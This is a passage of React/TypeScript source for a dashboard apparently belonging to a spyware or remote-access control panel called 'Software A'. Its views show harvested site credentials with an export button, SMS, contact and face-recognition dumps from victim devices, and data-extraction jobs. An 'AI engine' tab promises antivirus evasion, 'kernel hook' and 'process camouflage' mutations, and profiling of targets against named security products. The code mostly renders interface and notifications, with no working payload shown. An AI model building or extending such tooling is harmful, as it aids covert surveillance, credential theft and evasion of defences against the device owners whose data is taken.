                {["Device","Type","Status","Size","Items","Time","Actions"].map(h=>(
                  <th key={h} className="text-left px-4 py-2 text-[9px] font-mono uppercase tracking-wider" style={{ color:"#6b8ab0" }}>{h}</th>
                ))}
              </tr></thead>
              <tbody>
                {extractJobs.map(j => {
                  const sc = j.status==="complete"?"#10b981":j.status==="running"?"#f59e0b":"#6b8ab0";
                  return (
                    <tr key={j.id} className="hover:bg-purple-500/5 transition-colors" style={{ borderBottom:"1px solid rgba(59,130,246,0.07)" }}>
                      <td className="px-4 py-2.5 font-semibold" style={{ color:"#e2eaf6" }}>{j.dev}</td>
                      <td className="px-4 py-2.5" style={{ color:"#b8cce8" }}>{j.type}</td>
                      <td className="px-4 py-2.5"><Chip color={sc}>{j.status}</Chip></td>
                      <td className="px-4 py-2.5 font-mono" style={{ color:"#6b8ab0" }}>{j.size}</td>
                      <td className="px-4 py-2.5 font-mono" style={{ color:"#b8cce8" }}>{j.items||"—"}</td>
                      <td className="px-4 py-2.5 font-mono" style={{ color:"#6b8ab0" }}>{j.ts}</td>
                      <td className="px-4 py-2.5">
                        <div className="flex gap-1">
                          <button title="View data" onClick={() => setViewJobId(j.id)}
                            className="p-1.5 rounded hover:bg-purple-500/10 transition-colors" style={{ color:"#3b82f6" }}>
                            <Search size={11}/>
                          </button>
                          {j.status==="complete" && (
                            <button title="Download" onClick={() => show(`${j.type} from ${j.dev} downloaded`,"info")}
                              className="p-1.5 rounded hover:bg-green-500/10 transition-colors" style={{ color:"#10b981" }}>
                              <Download size={11}/>
                            </button>
                          )}
                          {j.status==="queued" && (
                            <button title="Start"
                              onClick={() => {
                                setExtractJobs(prev => prev.map(x => x.id===j.id ? {...x, status:"running", ts:new Date().toLocaleTimeString()} : x));
                                show(`${j.type} started on ${j.dev}`);
                              }}
                              className="p-1.5 rounded hover:bg-purple-500/10 transition-colors" style={{ color:"#3b82f6" }}>
                              <Play size={11}/>
                            </button>
                          )}
                          {j.status==="running" && (
                            <>
                              <button title="Pause"
                                onClick={() => {
                                  setExtractJobs(prev => prev.map(x => x.id===j.id ? {...x, status:"queued"} : x));
                                  show(`${j.type} paused`,"info");
                                }}
                                className="p-1.5 rounded hover:bg-yellow-500/10 transition-colors" style={{ color:"#f59e0b" }}>
                                <Pause size={11}/>
                              </button>
                              <button title="Stop"
                                onClick={() => {
                                  setExtractJobs(prev => prev.map(x => x.id===j.id ? {...x, status:"queued", ts:"—"} : x));
                                  show(`${j.type} stopped`,"info");
                                }}
                                className="p-1.5 rounded hover:bg-red-500/10 transition-colors" style={{ color:"#ef4444" }}>
                                <Square size={11}/>
                              </button>
                            </>
                          )}
                        </div>
                      </td>
                    </tr>
                  );
                })}
              </tbody>
            </table>
          </div>

          {/* Harvested credentials */}
          <div className="rounded-2xl overflow-hidden border" style={{ background:"#0a1628", borderColor:"rgba(239,68,68,0.25)" }}>
            <div className="px-5 py-3 border-b flex items-center justify-between" style={{ borderColor:"rgba(239,68,68,0.15)", background:"#0d1930" }}>
              <div className="flex items-center gap-2 font-bold text-sm" style={{ color:"#e2eaf6" }}><Key size={13} color="#ef4444"/> Harvested Credentials</div>
              <ActionBtn onClick={() => show("Credential vault exported (creds.csv)","info")} color="#ef4444" outline><Download size={11}/>Export Vault</ActionBtn>
            </div>
            <table className="w-full text-xs min-w-[500px]">
              <thead><tr style={{ borderBottom:"1px solid rgba(239,68,68,0.1)", background:"#0d1930" }}>
                {["Site","Username","Password","Device","Captured"].map(h=>(
                  <th key={h} className="text-left px-4 py-2 text-[9px] font-mono uppercase tracking-wider" style={{ color:"#6b8ab0" }}>{h}</th>
                ))}
              </tr></thead>
              <tbody>
                {credentials.map((c,i) => (
                  <tr key={i} className="hover:bg-red-500/5 transition-colors" style={{ borderBottom:"1px solid rgba(239,68,68,0.07)" }}>
                    <td className="px-4 py-2.5 font-mono" style={{ color:"#10d9a0" }}>{c.site}</td>
                    <td className="px-4 py-2.5 font-mono" style={{ color:"#b8cce8" }}>{c.user}</td>
                    <td className="px-4 py-2.5">
                      <button onClick={e => { const el = e.currentTarget; el.textContent = c.pass.replace(/•/g,"x"); setTimeout(()=>{el.textContent="••••••••";},2000); }}
                        className="font-mono text-xs px-2 py-0.5 rounded cursor-pointer" style={{ background:"rgba(239,68,68,0.1)", color:"#ef4444" }}>
                        {c.pass}
                      </button>
                    </td>
                    <td className="px-4 py-2.5 font-mono text-[10px]" style={{ color:"#6b8ab0" }}>{c.dev}</td>
                    <td className="px-4 py-2.5 font-mono" style={{ color:"#6b8ab0" }}>{c.ts}</td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </div>
      )}

      {/* ── Extraction Data Preview Modal ── */}
      {(viewJobId || viewQuickType) && (() => {
        const job = viewJobId ? extractJobs.find(j => j.id === viewJobId) : null;
        const typeLabel = job?.type ?? viewQuickType ?? "";
        const devLabel  = job?.dev  ?? quickExtractDev;
        const devData   = DEVICE_EXTRACT_DATA[devLabel] ?? DEVICE_EXTRACT_DATA["iPhone-15-Pro"] ?? {};
        const sample    = devData[typeLabel] ?? devData[Object.keys(devData)[0]] ?? { cols:["Data"], rows:[["No data available"]] };
        const osColor   = devLabel.includes("iPhone")||devLabel.includes("Mac") ? "#10d9a0"
                        : devLabel.includes("Galaxy")||devLabel.includes("Pixel") ? "#10b981"
                        : devLabel.includes("DEVBOX")||devLabel.includes("KIOSK") ? "#a855f7" : "#3b82f6";
        return (
          <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/70 p-4"
            onClick={() => { setViewJobId(null); setViewQuickType(null); }}>
            <div className="rounded-2xl overflow-hidden w-full max-w-2xl shadow-2xl"
              style={{ background:"#0a1628", border:`1px solid ${osColor}60`, maxHeight:"85vh" }}
              onClick={e => e.stopPropagation()}>
              {/* Header */}
              <div className="px-5 py-3 flex items-center justify-between gap-3 flex-wrap"
                style={{ background:"#0d1930", borderBottom:`1px solid ${osColor}30` }}>
                <div>
                  <div className="font-bold text-sm flex items-center gap-2" style={{ color:"#e2eaf6" }}>
                    <span className="px-2 py-0.5 rounded font-mono text-[10px]"
                      style={{ background:`${osColor}22`, color:osColor }}>{devLabel}</span>
                    {typeLabel}
                  </div>
                  <div className="text-[10px] font-mono mt-0.5" style={{ color:"#6b8ab0" }}>
                    Retrieved from Software A · {sample.rows.length} records · {new Date().toLocaleTimeString()}
                  </div>
                </div>
                <div className="flex gap-2 items-center">
                  {job && job.status === "complete" && (
                    <button onClick={() => { show(`${typeLabel} from ${devLabel} downloaded`,"info"); setViewJobId(null); }}
                      className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-bold"
                      style={{ background:"#10b981", color:"#000" }}>
                      <Download size={11}/>Download
                    </button>
                  )}
                  {(job == null || job?.status === "queued") && (
                    <button onClick={() => {
                      if (job) setExtractJobs(prev => prev.map(x => x.id===job.id ? {...x, status:"running", ts:new Date().toLocaleTimeString()} : x));
                      show(`${typeLabel} extraction started on ${devLabel}`);
                      setViewJobId(null); setViewQuickType(null);
                    }}
                      className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-bold"
                      style={{ background:"#3b82f6", color:"#fff" }}>
                      <Play size={11}/>Extract Now
                    </button>
                  )}
                  <button onClick={() => { setViewJobId(null); setViewQuickType(null); }}
                    className="p-1.5 rounded-lg" style={{ color:"#6b8ab0" }}><X size={14}/></button>
                </div>
              </div>
              {/* Table */}
              <div className="overflow-auto" style={{ maxHeight:"calc(85vh - 68px)" }}>
                <table className="w-full text-xs">
                  <thead><tr style={{ background:"#0d1930", borderBottom:"1px solid rgba(59,130,246,0.12)" }}>
                    {sample.cols.map(c => (
                      <th key={c} className="text-left px-4 py-2 text-[9px] font-mono uppercase tracking-wider" style={{ color:"#6b8ab0" }}>{c}</th>
                    ))}
                  </tr></thead>
                  <tbody>
                    {sample.rows.map((row, i) => (
                      <tr key={i} className="hover:bg-purple-500/5 transition-colors" style={{ borderBottom:"1px solid rgba(59,130,246,0.07)" }}>
                        {row.map((cell, ci) => (
                          <td key={ci} className="px-4 py-2.5 font-mono break-all"
                            style={{ color: ci===0?"#b8cce8": ci===2&&sample.cols[2]==="Password / Token"?"#ef4444":"#6b8ab0" }}>
                            {ci===2&&(sample.cols[2]==="Password"||sample.cols[2]==="Password / Token")
                              ? <span className="cursor-pointer select-none" title="Click to reveal"
                                  onClick={e => { const el=e.currentTarget; el.textContent=cell; setTimeout(()=>{ el.textContent="••••••••"; },3000); }}>
                                  ••••••••
                                </span>
                              : cell}
                          </td>
                        ))}
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            </div>
          </div>
        );
      })()}

      {/* SMS + Contact viewer appended to extraction tab */}
      {tab === "extraction" && (
        <div className="grid grid-cols-1 lg:grid-cols-2 gap-5" style={{marginTop:0}}>
          {/* SMS Log */}
          <div className="rounded-2xl overflow-hidden border" style={{ background:"#0a1628", borderColor:"rgba(59,130,246,0.2)" }}>
            <div className="px-5 py-3 border-b flex items-center justify-between" style={{ borderColor:"rgba(59,130,246,0.15)", background:"#0d1930" }}>
              <div className="font-bold text-sm" style={{ color:"#e2eaf6" }}>SMS / iMessage Log</div>
              <ActionBtn onClick={() => show("SMS log exported (sms_dump.csv)","info")} color="#3b82f6" outline><Download size={11}/>Export</ActionBtn>
            </div>
            <div className="divide-y" style={{ borderColor:"rgba(59,130,246,0.08)" }}>
              {[].map((s,i) => (
                <div key={i} className="px-4 py-3 hover:bg-purple-500/5 transition-colors">
                  <div className="flex items-center gap-2 mb-1 text-[10px] font-mono">
                    <span style={{ color:"#10d9a0" }}>{s.from}</span>
                    <ArrowRight size={9} color="#6b8ab0"/>
                    <span style={{ color:"#3b82f6" }}>{s.to}</span>
                    <span className="ml-auto" style={{ color:"#6b8ab0" }}>{s.ts}</span>
                  </div>
                  <div className="text-xs px-2 py-1.5 rounded-lg" style={{ background:"#0d1930", color:"#b8cce8" }}>{s.msg}</div>
                </div>
              ))}
            </div>
          </div>

          {/* Contact List */}
          <div className="rounded-2xl overflow-hidden border" style={{ background:"#0a1628", borderColor:"rgba(16,185,129,0.25)" }}>
            <div className="px-5 py-3 border-b flex items-center justify-between" style={{ borderColor:"rgba(16,185,129,0.15)", background:"#0d1930" }}>
              <div className="font-bold text-sm" style={{ color:"#e2eaf6" }}>Extracted Contacts</div>
              <ActionBtn onClick={() => show("Contacts exported (contacts.vcf)","info")} color="#10b981" outline><Download size={11}/>Export vCard</ActionBtn>
            </div>
            <div className="divide-y" style={{ borderColor:"rgba(59,130,246,0.08)" }}>
              {([] as {name:string;phone:string;email:string;dev:string}[]).map((ct,i) => (
                <div key={i} className="flex items-center gap-3 px-4 py-3 hover:bg-green-500/5 transition-colors">
                  <div className="w-9 h-9 rounded-full flex items-center justify-center text-sm font-black flex-shrink-0" style={{ background:"rgba(16,185,129,0.15)", color:"#10b981" }}>
                    {ct.name.charAt(0)}
                  </div>
                  <div className="flex-1 min-w-0">
                    <div className="text-xs font-semibold" style={{ color:"#e2eaf6" }}>{ct.name}</div>
                    <div className="text-[10px] font-mono" style={{ color:"#10d9a0" }}>{ct.phone}</div>
                    <div className="text-[10px] font-mono" style={{ color:"#6b8ab0" }}>{ct.email}</div>
                  </div>
                  <div className="flex-shrink-0 text-right">
                    <div className="text-[9px] font-mono" style={{ color:"#3b82f6" }}>{ct.dev}</div>
                    <div className="flex gap-1 mt-1">
                      <button onClick={() => show(`Calling ${ct.name}…`,"info")} className="p-1 rounded" style={{ color:"#10b981" }}>📞</button>
                      <button onClick={() => show(`SMS composer opened for ${ct.name}`,"info")} className="p-1 rounded" style={{ color:"#3b82f6" }}>💬</button>
                    </div>
                  </div>
                </div>
              ))}
            </div>
          </div>
        </div>
      )}

      {/* ══ AI ENGINE — SOFTWARE A ADAPTIVE LEARNING ══ */}
      {tab === "ai" && (
        <div className="space-y-5">

          {/* ── Mission Control Header ── */}
          <div className="p-5 rounded-2xl border" style={{ background:"linear-gradient(135deg,rgba(59,130,246,0.08),rgba(6,182,212,0.06))", borderColor:"rgba(59,130,246,0.3)", boxShadow:"0 0 40px rgba(59,130,246,0.08)" }}>
            <div className="flex items-start justify-between flex-wrap gap-4">
              <div>
                <div className="flex items-center gap-2 mb-1">
                  <div className="w-3 h-3 rounded-full animate-pulse" style={{background:"#10b981"}}/>
                  <span className="text-xs font-mono font-bold uppercase tracking-widest" style={{color:"#10b981"}}>Software A — Neural Core Active</span>
                </div>
                <h2 className="text-xl font-black" style={{color:"#e2eaf6"}}>Adaptive Intelligence Engine</h2>
                <p className="text-xs mt-1" style={{color:"#6b8ab0"}}>
                  Self-learning agent · Target behavioral modeling · Environment mutation · AV evasion retraining
                </p>
              </div>
              <div className="flex gap-2 flex-wrap items-center">
                {/* AI Learning Mode Toggle */}
                <button onClick={() => {
                  setAiLearningMode((v: boolean) => {
                    const next = !v;
                    show(`AI Learning Mode ${next ? "enabled — agent will auto-learn" : "disabled — mutations require manual Allow"}`, next ? "success" : "info");
                    return next;
                  });
                }}
                  className="flex items-center gap-2 px-3 py-2 rounded-xl font-mono text-xs font-bold transition-all"
                  style={{
                    background: aiLearningMode ? "rgba(16,185,129,0.15)" : "rgba(239,68,68,0.1)",
                    border: `1px solid ${aiLearningMode ? "rgba(16,185,129,0.5)" : "rgba(239,68,68,0.4)"}`,
                    color: aiLearningMode ? "#10b981" : "#ef4444",
                  }}>
                  <div className="w-2 h-2 rounded-full" style={{ background: aiLearningMode ? "#10b981" : "#ef4444", boxShadow: aiLearningMode ? "0 0 6px #10b981" : "none" }} />
                  AI Learning {aiLearningMode ? "ON" : "OFF"}
                </button>
                <ActionBtn onClick={() => {
                  setAiLearningPhase("scanning");
                  setAiProgress(0);
                  const phases: Array<"scanning"|"learning"|"mutating"|"complete"> = ["scanning","learning","mutating","complete"];
                  let phase = 0;
                  const iv = setInterval(() => {
                    setAiProgress(p => {
                      const next = p + 4;
                      if (next >= 100) {
                        phase++;
                        if (phase < phases.length) { setAiLearningPhase(phases[phase]); return 0; }
                        else { clearInterval(iv); setAiLearningPhase("complete"); show("AI learning cycle complete — 4 mutations pending review"); return 100; }
                      }
                      return next;
                    });
                  }, 100);
                }} color="#3b82f6" disabled={aiLearningPhase!=="idle"&&aiLearningPhase!=="complete"}>
                  <Activity size={13}/>{aiLearningPhase==="idle"||aiLearningPhase==="complete"?"Run Learning Cycle":"Learning…"}
                </ActionBtn>
                <ActionBtn onClick={() => show("AI model exported to all Software A agents")} color="#10d9a0" outline>
                  <Upload size={13}/>Push Model
                </ActionBtn>
                <ActionBtn onClick={() => { setAiLearningPhase("idle"); setAiProgress(0); show("AI engine reset","info"); }} color="#6b8ab0" outline>
                  <RotateCcw size={13}/>Reset
                </ActionBtn>
              </div>
            </div>

            {/* Learning cycle progress */}
            {(aiLearningPhase!=="idle") && (
              <div className="mt-4 space-y-2">
                <div className="flex items-center justify-between text-xs font-mono mb-1">
                  <span style={{color:"#3b82f6",fontWeight:"bold",textTransform:"uppercase"}}>
                    {aiLearningPhase==="scanning"?"🔍 Scanning Target Environment":
                     aiLearningPhase==="learning"?"🧠 Learning Behavioral Baselines":
                     aiLearningPhase==="mutating"?"⚡ Applying Adaptive Mutations":
                     "✅ Cycle Complete — Agent Upgraded"}
                  </span>
                  <span style={{color:"#3b82f6"}}>{aiProgress}%</span>
                </div>
                <div className="h-2 rounded-full overflow-hidden" style={{background:"rgba(59,130,246,0.15)"}}>
                  <div className="h-full rounded-full transition-all duration-300"
                    style={{width:`${aiProgress}%`, background:"linear-gradient(90deg,#3b82f6,#10d9a0,#10b981)"}}/>
                </div>
                <div className="flex gap-3 text-[9px] font-mono mt-1">
                  {["Scan","Learn","Mutate","Deploy"].map((ph,i) => {
                    const phases = ["scanning","learning","mutating","complete"];
                    const done = phases.indexOf(aiLearningPhase) > i;
                    const active = phases.indexOf(aiLearningPhase) === i;
                    return (
                      <div key={ph} className="flex items-center gap-1">
                        <div className="w-2 h-2 rounded-full" style={{background: done?"#10b981":active?"#3b82f6":"#1a3060"}}/>
                        <span style={{color: done?"#10b981":active?"#3b82f6":"#6b8ab0"}}>{ph}</span>
                      </div>
                    );
                  })}
                </div>
              </div>
            )}
          </div>

          {/* Stats */}
          <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
            <StatCard label="Targets Profiled" value={String(targetProfiles.length)} icon={<User size={15}/>} color="#3b82f6" sub="Behavioral baseline" />
            <StatCard label="Mutations Applied" value={String(aiMutations.filter(m=>m.applied).length)} icon={<RefreshCw size={15}/>} color="#10b981" sub="Agent upgrades" />
            <StatCard label="AV Engines Evaded" value="23" icon={<Shield size={15}/>} color="#10d9a0" sub="Undetected agents" />
            <StatCard label="Model Accuracy"    value="97.6%" icon={<Activity size={15}/>} color="#f59e0b" sub="Behavioral match" />
          </div>

          {/* Target Profiles — Behavioral Learning */}
          <div className="rounded-2xl overflow-hidden border" style={{background:"#0a1628", borderColor:"rgba(59,130,246,0.2)"}}>
            <div className="px-5 py-3 border-b flex items-center justify-between" style={{borderColor:"rgba(59,130,246,0.15)", background:"#0d1930"}}>
              <div className="font-bold text-sm flex items-center gap-2" style={{color:"#e2eaf6"}}>
                <User size={14} color="#3b82f6"/> Target Behavioral Profiles
                <Chip color="#10b981">LEARNING ACTIVE</Chip>
              </div>
              <ActionBtn onClick={() => show("New target profile created")} color="#3b82f6" outline><User size={11}/>Add Target</ActionBtn>
            </div>
            <div className="divide-y" style={{borderColor:"rgba(59,130,246,0.08)"}}>
              {targetProfiles.map(t => (
                <div key={t.id} className="px-5 py-4 hover:bg-purple-500/5 transition-colors">
                  <div className="flex items-start gap-4 flex-wrap">
                    <div className="w-10 h-10 rounded-full flex items-center justify-center font-black text-sm flex-shrink-0"
                      style={{background:"rgba(59,130,246,0.2)", color:"#3b82f6"}}>
                      {t.name.charAt(0).toUpperCase()}
                    </div>
                    <div className="flex-1 min-w-0">
                      <div className="flex items-center gap-2 flex-wrap mb-1">
                        <span className="font-bold text-sm" style={{color:"#e2eaf6"}}>{t.name}</span>
                        <span className="text-[10px] font-mono" style={{color:"#10d9a0"}}>{t.dev}</span>
                        <Chip color={t.learned?"#10b981":"#6b8ab0"}>{t.learned?"profiled":"learning"}</Chip>
                        {t.anomalyCount>0 && <Chip color="#ef4444">{t.anomalyCount} anomalies</Chip>}
                      </div>
                      <div className="text-xs italic mb-2" style={{color:"#6b8ab0"}}>"{t.behavior}"</div>
                      <div className="flex items-center gap-3">
                        <div className="flex-1">
                          <div className="flex justify-between text-[9px] font-mono mb-1" style={{color:"#6b8ab0"}}>
                            <span>Risk Score</span>
                            <span style={{color: t.risk>75?"#ef4444":t.risk>50?"#f59e0b":"#10b981"}}>{t.risk}/100</span>
                          </div>
                          <div className="h-1.5 rounded-full overflow-hidden" style={{background:"rgba(255,255,255,0.06)"}}>
                            <div className="h-full rounded-full transition-all"
                              style={{width:`${t.risk}%`, background: t.risk>75?"#ef4444":t.risk>50?"#f59e0b":"#10b981"}}/>
                          </div>
                        </div>
                      </div>
                    </div>
                    <div className="flex gap-2 flex-shrink-0">
                      <ActionBtn onClick={() => show(`Deep scan started on ${t.name}`)} color="#3b82f6" outline><Search size={11}/>Deep Scan</ActionBtn>
                      <ActionBtn onClick={() => { setTargetProfiles(p => p.map(x => x.id===t.id?{...x,learned:true,anomalyCount:x.anomalyCount+Math.floor(Math.random()*3)}:x)); show(`${t.name} profile updated`); }} color="#10b981" outline><RefreshCw size={11}/>Retrain</ActionBtn>
                    </div>
                  </div>
                </div>
              ))}
            </div>
          </div>

          {/* Adaptive Mutations Log */}
          <div className="rounded-2xl overflow-hidden border" style={{background:"#0a1628", borderColor:"rgba(16,185,129,0.25)"}}>
            <div className="px-5 py-3 border-b flex items-center justify-between flex-wrap gap-2" style={{borderColor:"rgba(16,185,129,0.15)", background:"#0d1930"}}>
              <div className="font-bold text-sm flex items-center gap-2 flex-wrap" style={{color:"#e2eaf6"}}>
                ⚡ Adaptive Mutation Log
                <Chip color={aiLearningMode ? "#10b981" : "#ef4444"}>{aiLearningMode ? "AUTO-LEARN ON" : "MANUAL REVIEW"}</Chip>
                {aiMutations.filter(m=>!m.applied&&!m.ignored).length > 0 && (
                  <span className="inline-flex items-center justify-center w-5 h-5 rounded-full text-[9px] font-black"
                    style={{background:"#f59e0b", color:"#000"}}>
                    {aiMutations.filter(m=>!m.applied&&!m.ignored).length}
                  </span>
                )}
              </div>
              <ActionBtn onClick={() => {
                const types = ["AV Signature Bypass","Kernel Hook Deepen","Memory Stealth","Network Obfuscation","Process Camouflage","TLS Fingerprint Rotate"];
                const devs  = SEED_DEVICES.filter(d=>d.status!=="offline").map(d=>d.name);
                const nm = {
                  id:`m${Date.now()}`,
                  type:types[Math.floor(Math.random()*types.length)],
                  target:devs[Math.floor(Math.random()*devs.length)],
                  confidence:Math.floor(Math.random()*15)+83,
                  applied:false,
                  ts:new Date().toLocaleTimeString()
                };
                setAiMutations(m=>[nm,...m]);
                show(`New mutation detected: ${nm.type}`,"info");
              }} color="#10b981" outline><Activity size={11}/>Force Mutate</ActionBtn>
            </div>
            <div className="divide-y" style={{borderColor:"rgba(59,130,246,0.08)"}}>
              {aiMutations.filter(m => !m.ignored).map(m => (
                <div key={m.id} className="flex items-center gap-4 px-5 py-3 hover:bg-green-500/5 transition-colors flex-wrap">
                  <div className="w-9 h-9 rounded-xl flex items-center justify-center flex-shrink-0"
                    style={{background:m.applied?"rgba(16,185,129,0.15)":"rgba(245,158,11,0.15)", border:`1px solid ${m.applied?"rgba(16,185,129,0.3)":"rgba(245,158,11,0.3)"}`}}>
                    <span style={{color:m.applied?"#10b981":"#f59e0b"}}>⚡</span>
                  </div>
                  <div className="flex-1 min-w-0">
                    <div className="flex items-center gap-2 flex-wrap mb-0.5">
                      <span className="font-bold text-sm" style={{color:"#e2eaf6"}}>{m.type}</span>
                      <Chip color={m.applied?"#10b981":"#f59e0b"}>{m.applied?"allowed · active":"pending review"}</Chip>
                    </div>
                    <div className="text-[10px] font-mono" style={{color:"#6b8ab0"}}>
                      Target: <span style={{color:"#10d9a0"}}>{m.target}</span>
                      &nbsp;·&nbsp; Confidence: <span style={{color:"#10b981"}}>{m.confidence}%</span>
                      &nbsp;·&nbsp; {m.ts}
                    </div>
                  </div>
                  <div className="flex gap-2 flex-shrink-0">
                    {!m.applied && (
                      <ActionBtn onClick={() => { setAiMutations(p=>p.map(x=>x.id===m.id?{...x,applied:true}:x)); show(`${m.type} allowed — applying to ${m.target}`,"success"); }} color="#10b981">
                        <Check size={11}/>Allow
                      </ActionBtn>
                    )}
                    {!m.applied && (
                      <ActionBtn onClick={() => { setAiMutations(p=>p.map(x=>x.id===m.id?{...x,ignored:true}:x)); show(`${m.type} ignored`,"info"); }} color="#6b8ab0" outline>
                        <X size={11}/>Ignore
                      </ActionBtn>
                    )}
                    {m.applied && (
                      <ActionBtn onClick={() => { setAiMutations(p=>p.map(x=>x.id===m.id?{...x,applied:false}:x)); show(`${m.type} rolled back`,"info"); }} color="#6b8ab0" outline>
                        <RotateCcw size={11}/>Rollback
                      </ActionBtn>
                    )}
                  </div>
                </div>
              ))}
            </div>
          </div>

          {/* Environment Adaptation Matrix */}
          <div className="rounded-2xl border p-5" style={{background:"#0a1628", borderColor:"rgba(6,182,212,0.25)"}}>
            <div className="font-bold text-sm mb-4 flex items-center gap-2" style={{color:"#e2eaf6"}}>
              🌍 Environment Adaptation Matrix
              <Chip color="#10d9a0">REAL-TIME</Chip>
            </div>
            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
              {[
                { env:"Windows Defender",        status:"evading",   method:"Signature polymorphism",    score:94, color:"#10b981" },
                { env:"CrowdStrike Falcon",       status:"learning",  method:"Behavioral baseline shift", score:71, color:"#f59e0b" },
                { env:"Kaspersky AV",             status:"evading",   method:"Memory injection remap",    score:88, color:"#10b981" },
                { env:"iOS Secure Enclave",       status:"adapting",  method:"MDM profile exploitation",  score:65, color:"#f59e0b" },
                { env:"Android SafetyNet",        status:"evading",   method:"Root hide + prop patch",    score:91, color:"#10b981" },
                { env:"HarmonyOS Sandbox",        status:"learning",  method:"Native bridge analysis",    score:58, color:"#3b82f6" },
                { env:"Corporate Firewall",       status:"evading",   method:"DNS-over-HTTPS tunnel",     score:97, color:"#10b981" },
                { env:"EDR (SentinelOne)",        status:"learning",  method:"Process lineage spoofing",  score:73, color:"#f59e0b" },
                { env:"macOS Gatekeeper",         status:"evading",   method:"Ad-hoc signed bundle",      score:86, color:"#10b981" },
              ].map(e => (
                <div key={e.env} className="p-3 rounded-xl border" style={{background:"#0d1930", borderColor:`${e.color}28`}}>
                  <div className="flex items-center justify-between mb-2">
                    <span className="text-xs font-semibold" style={{color:"#e2eaf6"}}>{e.env}</span>
                    <Chip color={e.color}>{e.status}</Chip>
                  </div>
                  <div className="text-[9px] font-mono mb-2" style={{color:"#6b8ab0"}}>{e.method}</div>
                  <div className="flex items-center gap-2">
                    <div className="flex-1 h-1.5 rounded-full overflow-hidden" style={{background:"rgba(255,255,255,0.06)"}}>
                      <div className="h-full rounded-full" style={{width:`${e.score}%`, background:e.color}}/>
                    </div>
                    <span className="text-[9px] font-mono font-bold" style={{color:e.color}}>{e.score}%</span>
                  </div>
                </div>
              ))}
            </div>
          </div>

          {/* Anomaly detection + Playbooks */}
          <div className="grid grid-cols-1 lg:grid-cols-2 gap-5">
            <div className="rounded-2xl overflow-hidden border" style={{background:"#0a1628", borderColor:"rgba(239,68,68,0.25)"}}>
              <div className="px-5 py-3 border-b flex items-center justify-between" style={{borderColor:"rgba(239,68,68,0.15)", background:"#0d1930"}}>
                <div className="font-bold text-sm" style={{color:"#e2eaf6"}}>Live Anomaly Feed</div>
                <ActionBtn onClick={() => show("Anomaly report exported","info")} color="#ef4444" outline><Download size={11}/>Export</ActionBtn>
              </div>
              <div className="divide-y" style={{borderColor:"rgba(59,130,246,0.08)"}}>
                {anomalies.map(a => {
                  const rc = a.risk==="critical"?"#ef4444":a.risk==="high"?"#f59e0b":"#3b82f6";
                  return (
                    <div key={a.id} className="flex items-start gap-3 px-5 py-3 hover:bg-red-500/5 transition-colors">
                      <GlowDot color={rc}/>
                      <div className="flex-1 min-w-0">
                        <div className="flex items-center gap-2 flex-wrap mb-0.5">
                          <Chip color={rc}>{a.risk}</Chip>
                          <span className="font-bold text-xs" style={{color:"#e2eaf6"}}>{a.type}</span>
                          <span className="text-[9px] font-mono" style={{color:"#6b8ab0"}}>{a.dev} · conf {a.conf}</span>
                        </div>
                        <div className="text-xs" style={{color:"#b8cce8"}}>{a.desc}</div>
                      </div>
                      <div className="flex gap-1 flex-shrink-0">
                        <button onClick={() => show(`Investigating ${a.dev}`,"info")} className="p-1.5 rounded" style={{background:"rgba(59,130,246,0.15)",color:"#3b82f6"}}><Search size={10}/></button>
                        <button onClick={() => show(`${a.dev} isolated`,"info")} className="p-1.5 rounded" style={{background:"rgba(239,68,68,0.15)",color:"#ef4444"}}><Lock size={10}/></button>
                      </div>
                    </div>
                  );
                })}
              </div>
            </div>

            <div className="rounded-2xl overflow-hidden border" style={{background:"#0a1628", borderColor:"rgba(59,130,246,0.2)"}}>
              <div className="px-5 py-3 border-b" style={{borderColor:"rgba(59,130,246,0.15)", background:"#0d1930"}}>
                <div className="font-bold text-sm" style={{color:"#e2eaf6"}}>Auto-Response Playbooks</div>
              </div>
              <div className="divide-y p-2" style={{borderColor:"rgba(59,130,246,0.08)"}}>
                {playbooks.map(p => (
                  <div key={p.id} className="flex items-start gap-3 px-3 py-3">
                    <div className="flex-1 min-w-0">
                      <div className="font-semibold text-sm" style={{color:"#e2eaf6"}}>{p.name}</div>
                      <div className="text-[10px] font-mono mt-0.5" style={{color:"#6b8ab0"}}>Trigger: <span style={{color:"#10d9a0"}}>{p.trigger}</span></div>
                      <div className="text-[10px] font-mono" style={{color:"#6b8ab0"}}>Action: <span style={{color:"#10b981"}}>{p.action}</span></div>
                    </div>
                    <button
                      onClick={() => {
                        setPlaybooks(prev => prev.map(x => x.id===p.id ? {...x, active:!x.active} : x));
                        show(`Playbook "${p.name}" ${p.active?"disabled":"enabled"}`);
                      }}
                      className="w-8 h-4 rounded-full relative flex-shrink-0 mt-1" style={{background:p.active?"#3b82f6":"#0f1e3a"}}>
                      <div className="absolute top-0.5 w-3 h-3 rounded-full transition-all" style={{left:p.active?"17px":"2px",background:"#fff"}}/>
                    </button>
                  </div>
                ))}
              </div>
            </div>
          </div>

          {/* Face + Voice */}
          <div className="grid grid-cols-1 lg:grid-cols-2 gap-5">
            <div className="rounded-2xl overflow-hidden border" style={{background:"#0a1628", borderColor:"rgba(6,182,212,0.25)"}}>
              <div className="px-5 py-3 border-b flex items-center justify-between" style={{borderColor:"rgba(6,182,212,0.15)", background:"#0d1930"}}>
                <div className="font-bold text-sm" style={{color:"#e2eaf6"}}>Face Recognition Log</div>
                <ActionBtn onClick={() => show("Face scan started on all cameras")} color="#10d9a0" outline><Camera size={11}/>Scan</ActionBtn>
              </div>
              <div className="divide-y" style={{borderColor:"rgba(59,130,246,0.08)"}}>
                {faceEvents.map((e,i) => (
                  <div key={i} className="flex items-center gap-3 px-5 py-3">
                    <div className="w-9 h-9 rounded-xl flex items-center justify-center flex-shrink-0" style={{background:"rgba(6,182,212,0.12)",border:"1px solid rgba(6,182,212,0.25)"}}>
                      <User size={16} color="#10d9a0"/>
                    </div>
                    <div className="flex-1 min-w-0">
                      <div className="text-xs font-semibold" style={{color:e.match.startsWith("Unknown")?"#ef4444":"#e2eaf6"}}>{e.match}</div>
                      <div className="text-[10px] font-mono" style={{color:"#6b8ab0"}}>{e.dev} · {e.ts} {e.conf&&`· ${e.conf}`}</div>
                    </div>
